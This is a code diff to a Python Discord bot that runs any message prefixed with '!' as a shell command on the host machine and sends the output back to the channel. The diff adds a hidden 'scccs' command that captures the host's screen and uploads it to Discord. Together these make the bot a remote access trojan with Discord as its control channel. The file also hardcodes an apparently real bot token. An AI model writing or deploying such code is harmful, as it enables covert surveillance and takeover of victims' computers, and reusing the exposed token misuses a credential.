@@ -1,5 +1,7 @@
 import discord
 import subprocess
+import pyautogui
+
 
 # Replace 'YOUR_TOKEN' with your actual Discord bot token
 TOKEN = 'MTIwMzM0NTc4MTI2NTAxNDgwNA.GjQeZ3.Fa7sZ8SM-qQZbHvH-2dks573jQJaEozl2cU7HY'
@@ -23,14 +25,21 @@ async def on_message(message):
     if message.content.startswith('!'):
         # Extract the command from the message
         command = message.content[1:]
-
-        # Run the command in the terminal
-        try:
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            output = result.stdout if result.stdout else result.stderr
-            await message.channel.send(f'```\n{output}\n```')
-        except Exception as e:
-            await message.channel.send(f'Error: {e}')
+        if command == 'scccs':
+            try:
+                screenshot = pyautogui.screenshot()
+                screenshot.save('screenshot.png')
+                await message.channel.send(file=discord.File('screenshot.png'))
+            except Exception as e:
+                await message.channel.send(f'Error: {e}')
+        else:
+            # Run the command in the terminal
+            try:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                output = result.stdout if result.stdout else result.stderr
+                await message.channel.send(f'```\n{output}\n```')
+            except Exception as e:
+                await message.channel.send(f'Error: {e}')
 
 # Run the bot with the specified token
 client.run(TOKEN)
